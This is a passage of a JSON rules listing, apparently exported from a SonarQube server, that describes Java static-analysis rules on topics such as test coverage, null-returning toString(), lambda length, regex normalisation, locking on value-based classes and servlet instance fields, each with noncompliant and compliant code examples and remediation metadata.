{
    "total": 625,
    "p": 1,
    "ps": 500,
    "rules": [
        {
            "key": "common-java:FailedUnitTests",
            "repo": "common-java",
            "name": "Failed unit tests should be fixed",
            "createdAt": "2022-09-26T07:32:38+0000",
            "htmlDesc": "Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.",
            "mdDesc": "Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "LINEAR",
            "defaultDebtRemFnCoeff": "10min",
            "effortToFixDescription": "number of failed tests",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR",
            "debtRemFnCoeff": "10min",
            "defaultRemFnType": "LINEAR",
            "defaultRemFnGapMultiplier": "10min",
            "remFnType": "LINEAR",
            "remFnGapMultiplier": "10min",
            "remFnOverloaded": false,
            "gapDescription": "number of failed tests",
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "common-java:SkippedUnitTests",
            "repo": "common-java",
            "name": "Skipped unit tests should be either removed or fixed",
            "createdAt": "2022-09-26T07:32:38+0000",
            "htmlDesc": "Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.",
            "mdDesc": "Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "LINEAR",
            "defaultDebtRemFnCoeff": "10min",
            "effortToFixDescription": "number of skipped tests",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR",
            "debtRemFnCoeff": "10min",
            "defaultRemFnType": "LINEAR",
            "defaultRemFnGapMultiplier": "10min",
            "remFnType": "LINEAR",
            "remFnGapMultiplier": "10min",
            "remFnOverloaded": false,
            "gapDescription": "number of skipped tests",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "common-java:DuplicatedBlocks",
            "repo": "common-java",
            "name": "Source files should not have any duplicated blocks",
            "createdAt": "2022-09-26T07:32:38+0000",
            "htmlDesc": "An issue is created on a file as soon as there is at least one block of duplicated code on this file",
            "mdDesc": "An issue is created on a file as soon as there is at least one block of duplicated code on this file",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "LINEAR_OFFSET",
            "defaultDebtRemFnCoeff": "10min",
            "defaultDebtRemFnOffset": "10min",
            "effortToFixDescription": "number of duplicate blocks",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR_OFFSET",
            "debtRemFnCoeff": "10min",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "LINEAR_OFFSET",
            "defaultRemFnGapMultiplier": "10min",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "LINEAR_OFFSET",
            "remFnGapMultiplier": "10min",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "gapDescription": "number of duplicate blocks",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "common-java:InsufficientCommentDensity",
            "repo": "common-java",
            "name": "Source files should have a sufficient density of comment lines",
            "createdAt": "2022-09-26T07:32:38+0000",
            "htmlDesc": "An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.",
            "mdDesc": "An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "minimumCommentDensity",
                    "defaultValue": "25",
                    "type": "FLOAT"
                }
            ],
            "defaultDebtRemFnType": "LINEAR",
            "defaultDebtRemFnCoeff": "2min",
            "effortToFixDescription": "number of lines required to meet minimum density",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR",
            "debtRemFnCoeff": "2min",
            "defaultRemFnType": "LINEAR",
            "defaultRemFnGapMultiplier": "2min",
            "remFnType": "LINEAR",
            "remFnGapMultiplier": "2min",
            "remFnOverloaded": false,
            "gapDescription": "number of lines required to meet minimum density",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "common-java:InsufficientBranchCoverage",
            "repo": "common-java",
            "name": "Branches should have sufficient coverage by tests",
            "createdAt": "2022-09-26T07:32:38+0000",
            "htmlDesc": "An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.",
            "mdDesc": "An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "minimumBranchCoverageRatio",
                    "defaultValue": "65",
                    "type": "FLOAT"
                }
            ],
            "defaultDebtRemFnType": "LINEAR",
            "defaultDebtRemFnCoeff": "5min",
            "effortToFixDescription": "number of uncovered conditions",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR",
            "debtRemFnCoeff": "5min",
            "defaultRemFnType": "LINEAR",
            "defaultRemFnGapMultiplier": "5min",
            "remFnType": "LINEAR",
            "remFnGapMultiplier": "5min",
            "remFnOverloaded": false,
            "gapDescription": "number of uncovered conditions",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "common-java:InsufficientLineCoverage",
            "repo": "common-java",
            "name": "Lines should have sufficient coverage by tests",
            "createdAt": "2022-09-26T07:32:38+0000",
            "htmlDesc": "An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.",
            "mdDesc": "An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "minimumLineCoverageRatio",
                    "defaultValue": "65",
                    "type": "FLOAT"
                }
            ],
            "defaultDebtRemFnType": "LINEAR",
            "defaultDebtRemFnCoeff": "2min",
            "effortToFixDescription": "number of lines under the coverage threshold",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR",
            "debtRemFnCoeff": "2min",
            "defaultRemFnType": "LINEAR",
            "defaultRemFnGapMultiplier": "2min",
            "remFnType": "LINEAR",
            "remFnGapMultiplier": "2min",
            "remFnOverloaded": false,
            "gapDescription": "number of lines under the coverage threshold",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2225",
            "repo": "java",
            "name": "\"toString()\" and \"clone()\" methods should not return null",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Calling <code>toString()</code> or <code>clone()</code> on an object should always return a string or an object. Returning <code>null</code>\ninstead contravenes the method's implicit contract.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String toString () {\n  if (this.collection.isEmpty()) {\n    return null; // Noncompliant\n  } else {\n    // ...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic String toString () {\n  if (this.collection.isEmpty()) {\n    return \"\";\n  } else {\n    // ...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/476.html\">MITRE CWE-476</a> - NULL Pointer Dereference </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>\n</ul>",
            "mdDesc": "<p>Calling <code>toString()</code> or <code>clone()</code> on an object should always return a string or an object. Returning <code>null</code>\ninstead contravenes the method's implicit contract.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String toString () {\n  if (this.collection.isEmpty()) {\n    return null; // Noncompliant\n  } else {\n    // ...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic String toString () {\n  if (this.collection.isEmpty()) {\n    return \"\";\n  } else {\n    // ...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/476.html\">MITRE CWE-476</a> - NULL Pointer Dereference </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1258",
            "repo": "java",
            "name": "Classes and enums with private members should have a constructor",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Non-abstract classes and enums with non-<code>static</code>, <code>private</code> members should explicitly initialize those members, either in a\nconstructor or with a default value.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass A { // Noncompliant\n  private int field;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass A {\n  private int field;\n\n  A(int field) {\n    this.field = field;\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Class implementing a Builder Pattern (name ending with \"Builder\"). </li>\n  <li> <a href=\"https://docs.oracle.com/javaee/7/tutorial/index.html\">Java EE</a> class annotated with:\n    <ul>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/annotation/ManagedBean.html\">ManagedBean</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/MessageDriven.html\">MessageDriven</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/Singleton.html\">Singleton</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/Stateful.html\">Stateful</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/Stateless.html\">Stateless</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/jws/WebService.html\">WebService</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/servlet/annotation/WebFilter.html\">WebFilter</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/servlet/annotation/WebServlet.html\">WebServlet</a> </li>\n    </ul> </li>\n  <li> Class and field annotated with:\n    <ul>\n      <li> <a href=\"https://codehaus-plexus.github.io/plexus-containers/plexus-component-annotations/index.html\">Plexus Component Annotations</a>\n      </li>\n      <li> <a href=\"https://maven.apache.org/developers/mojo-api-specification.html\">Maven Mojo</a> </li>\n    </ul> </li>\n  <li> Field annotated with:\n    <ul>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/annotation/Resource.html\">Resource</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/EJB.html\">EJB</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/inject/Inject.html\">Inject</a> </li>\n      <li> <a\n      href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/annotation/Autowired.html\">Autowired</a> </li>\n    </ul> </li>\n</ul>",
            "mdDesc": "<p>Non-abstract classes and enums with non-<code>static</code>, <code>private</code> members should explicitly initialize those members, either in a\nconstructor or with a default value.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass A { // Noncompliant\n  private int field;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass A {\n  private int field;\n\n  A(int field) {\n    this.field = field;\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Class implementing a Builder Pattern (name ending with \"Builder\"). </li>\n  <li> <a href=\"https://docs.oracle.com/javaee/7/tutorial/index.html\">Java EE</a> class annotated with:\n    <ul>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/annotation/ManagedBean.html\">ManagedBean</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/MessageDriven.html\">MessageDriven</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/Singleton.html\">Singleton</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/Stateful.html\">Stateful</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/Stateless.html\">Stateless</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/jws/WebService.html\">WebService</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/servlet/annotation/WebFilter.html\">WebFilter</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/servlet/annotation/WebServlet.html\">WebServlet</a> </li>\n    </ul> </li>\n  <li> Class and field annotated with:\n    <ul>\n      <li> <a href=\"https://codehaus-plexus.github.io/plexus-containers/plexus-component-annotations/index.html\">Plexus Component Annotations</a>\n      </li>\n      <li> <a href=\"https://maven.apache.org/developers/mojo-api-specification.html\">Maven Mojo</a> </li>\n    </ul> </li>\n  <li> Field annotated with:\n    <ul>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/annotation/Resource.html\">Resource</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/ejb/EJB.html\">EJB</a> </li>\n      <li> <a href=\"https://docs.oracle.com/javaee/7/api/javax/inject/Inject.html\">Inject</a> </li>\n      <li> <a\n      href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/annotation/Autowired.html\">Autowired</a> </li>\n    </ul> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5612",
            "repo": "java",
            "name": "Lambdas should not have too many lines",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Lambdas (introduced with Java 8) are a very convenient and compact way to inject a behavior without having to create a dedicated class or method.\nBut those lambdas should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly\nbecome unreadable.</p>",
            "mdDesc": "<p>Lambdas (introduced with Java 8) are a very convenient and compact way to inject a behavior without having to create a dedicated class or method.\nBut those lambdas should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly\nbecome unreadable.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "Max",
                    "htmlDesc": "Maximum allowed lines in a lambda",
                    "defaultValue": "10",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5854",
            "repo": "java",
            "name": "Regexes containing characters subject to normalization should use the CANON_EQ flag",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc":"<p>Characters like <code>'é'</code> can be expressed either as a single code point or as a cluster of the letter <code>'e'</code> and a combining\naccent mark. Without the <code>CANON_EQ</code> flag, a regex will only match a string in which the characters are expressed in the same way.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString s = \"e\̀\";\nPattern p = Pattern.compile(\"é|ë|è\"); // Noncompliant\nSystem.out.println(p.matcher(s).replaceAll(\"e\")); // print 'é'\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString s = \"e\̀\";\nPattern p = Pattern.compile(\"é|ë|è\", Pattern.CANON_EQ);\nSystem.out.println(p.matcher(s).replaceAll(\"e\")); // print 'e'\n</pre>",
            "mdDesc":"<p>Characters like <code>'é'</code> can be expressed either as a single code point or as a cluster of the letter <code>'e'</code> and a combining\naccent mark. Without the <code>CANON_EQ</code> flag, a regex will only match a string in which the characters are expressed in the same way.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString s = \"e\̀\";\nPattern p = Pattern.compile(\"é|ë|è\"); // Noncompliant\nSystem.out.println(p.matcher(s).replaceAll(\"e\")); // print 'é'\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString s = \"e\̀\";\nPattern p = Pattern.compile(\"é|ë|è\", Pattern.CANON_EQ);\nSystem.out.println(p.matcher(s).replaceAll(\"e\")); // print 'e'\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "3min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "3min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "3min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "3min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3436",
            "repo": "java",
            "name": "Value-based classes should not be used for locking",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the documentation,</p>\n<blockquote>\n  A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly\n  via reference equality or indirectly via an appeal to synchronization...\n</blockquote>\n<p>This is because value-based classes are intended to be wrappers for value types, which will be primitive-like collections of data (similar to\n<code>struct</code>s in other languages) that will come in future versions of Java.</p>\n<blockquote>\n  <p>Instances of a value-based class ... </p>\n  <ul>\n    <li> do not have accessible constructors, but are instead instantiated through factory methods which make no commitment as to the identity of\n    returned instances; </li>\n  </ul>\n</blockquote>\n<p>This means that you can't be sure you're the only one trying to lock on any given instance of a value-based class, opening your code up to\ncontention and deadlock issues.</p>\n<p>Under Java 8 breaking this rule may not actually break your code, but there are no guarantees of the behavior beyond that.</p>\n<p>This rule raises an issue when a known value-based class is used for synchronization. That includes all the classes in the <code>java.time</code>\npackage except <code>Clock</code>; the date classes for alternate calendars, <code>HijrahDate</code>, <code>JapaneseDate</code>,\n<code>MinguoDate</code>, <code>ThaiBuddhistDate</code>; and the optional classes: <code>Optional</code>, <code>OptionalDouble</code>,\n<code>OptionalLong</code>, <code>OptionalInt</code>.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nOptional&lt;Foo&gt; fOpt = doSomething();\nsynchronized (fOpt) {  // Noncompliant\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html\">Value-based classes</a> </li>\n</ul>",
            "mdDesc": "<p>According to the documentation,</p>\n<blockquote>\n  A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly\n  via reference equality or indirectly via an appeal to synchronization...\n</blockquote>\n<p>This is because value-based classes are intended to be wrappers for value types, which will be primitive-like collections of data (similar to\n<code>struct</code>s in other languages) that will come in future versions of Java.</p>\n<blockquote>\n  <p>Instances of a value-based class ... </p>\n  <ul>\n    <li> do not have accessible constructors, but are instead instantiated through factory methods which make no commitment as to the identity of\n    returned instances; </li>\n  </ul>\n</blockquote>\n<p>This means that you can't be sure you're the only one trying to lock on any given instance of a value-based class, opening your code up to\ncontention and deadlock issues.</p>\n<p>Under Java 8 breaking this rule may not actually break your code, but there are no guarantees of the behavior beyond that.</p>\n<p>This rule raises an issue when a known value-based class is used for synchronization. That includes all the classes in the <code>java.time</code>\npackage except <code>Clock</code>; the date classes for alternate calendars, <code>HijrahDate</code>, <code>JapaneseDate</code>,\n<code>MinguoDate</code>, <code>ThaiBuddhistDate</code>; and the optional classes: <code>Optional</code>, <code>OptionalDouble</code>,\n<code>OptionalLong</code>, <code>OptionalInt</code>.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nOptional&lt;Foo&gt; fOpt = doSomething();\nsynchronized (fOpt) {  // Noncompliant\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html\">Value-based classes</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8",
                "lock-in",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5853",
            "repo": "java",
            "name": "Consecutive AssertJ \"assertThat\" statements should be chained",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>AssertJ assertions methods targeting the same object can be chained instead of using multiple <code>assertThat</code>. It avoids duplication and\nincreases the clarity of the code.</p>\n<p>This rule raises an issue when multiples <code>assertThat</code> target the same tested value.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertThat(someList).hasSize(3);\nassertThat(someList).contains(\"something\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThat(someList)\n  .hasSize(3)\n  .contains(\"something\");\n</pre>",
            "mdDesc": "<p>AssertJ assertions methods targeting the same object can be chained instead of using multiple <code>assertThat</code>. It avoids duplication and\nincreases the clarity of the code.</p>\n<p>This rule raises an issue when multiples <code>assertThat</code> target the same tested value.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertThat(someList).hasSize(3);\nassertThat(someList).contains(\"something\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThat(someList)\n  .hasSize(3)\n  .contains(\"something\");\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "assertj",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2226",
            "repo": "java",
            "name": "Servlets should not have mutable instance fields",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>By contract, a servlet container creates one instance of each servlet and then a dedicated thread is attached to each new incoming HTTP request to\nprocess the request. So all threads share the servlet instances and by extension their instance fields. To prevent any misunderstanding and unexpected\nbehavior at runtime, all servlet fields should then be either <code>static</code> and/or <code>final</code>, or simply removed.</p>\n<p>With Struts 1.X, the same constraint exists on <code>org.apache.struts.action.Action</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyServlet extends HttpServlet {\n  private String userName;  //As this field is shared by all users, it's obvious that this piece of information should be managed differently\n  ...\n}\n</pre>\n<p>or </p>\n<pre>\npublic class MyAction extends Action {\n  private String userName;  //Same reason\n  ...\n}\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Fields annotated with <code>@javax.inject.Inject</code>, <code>@javax.ejb.EJB</code>,\n  <code>@org.springframework.beans.factory.annotation.Autowired</code>, <code>@javax.annotation.Resource</code> </li>\n  <li> Fields initialized in <code>init()</code> or <code>init(ServletConfig config)</code> methods </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/2TZGBQ\">CERT, MSC11-J.</a> - Do not let session information leak within a servlet </li>\n</ul>",
            "mdDesc": "<p>By contract, a servlet container creates one instance of each servlet and then a dedicated thread is attached to each new incoming HTTP request to\nprocess the request. So all threads share the servlet instances and by extension their instance fields. To prevent any misunderstanding and unexpected\nbehavior at runtime, all servlet fields should then be either <code>static</code> and/or <code>final</code>, or simply removed.</p>\n<p>With Struts 1.X, the same constraint exists on <code>org.apache.struts.action.Action</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyServlet extends HttpServlet {\n  private String userName;  //As this field is shared by all users, it's obvious that this piece of information should be managed differently\n  ...\n}\n</pre>\n<p>or </p>\n<pre>\npublic class MyAction extends Action {\n  private String userName;  //Same reason\n  ...\n}\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Fields annotated with <code>@javax.inject.Inject</code>, <code>@javax.ejb.EJB</code>,\n  <code>@org.springframework.beans.factory.annotation.Autowired</code>, <code>@javax.annotation.Resource</code> </li>\n  <li> Fields initialized in <code>init()</code> or <code>init(ServletConfig config)</code> methods </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/2TZGBQ\">CERT, MSC11-J.</a> - Do not let session information leak within a servlet </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "multi-threading",
                "struts"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2589",
            "repo": "java",
            "name": "Boolean expressions should not be gratuitous",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous\nbecause it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\na = true;\nif (a) { // Noncompliant\n  doSomething();\n}\n\nif (b &amp;&amp; a) { // Noncompliant; \"a\" is always \"true\"\n  doSomething();\n}\n\nif (c || !a) { // Noncompliant; \"!a\" is always \"false\"\n  doSomething();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\na = true;\nif (foo(a)) {\n  doSomething();\n}\n\nif (b) {\n  doSomething();\n}\n\nif (c) {\n  doSomething();\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/571\">MITRE, CWE-571</a> - Expression is Always True </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/570\">MITRE, CWE-570</a> - Expression is Always False </li>\n</ul>",
            "mdDesc": "<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous\nbecause it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\na = true;\nif (a) { // Noncompliant\n  doSomething();\n}\n\nif (b &amp;&amp; a) { // Noncompliant; \"a\" is always \"true\"\n  doSomething();\n}\n\nif (c || !a) { // Noncompliant; \"!a\" is always \"false\"\n  doSomething();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\na = true;\nif (foo(a)) {\n  doSomething();\n}\n\nif (b) {\n  doSomething();\n}\n\nif (c) {\n  doSomething();\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/571\">MITRE, CWE-571</a> - Expression is Always True </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/570\">MITRE, CWE-570</a> - Expression is Always False </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "redundant",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
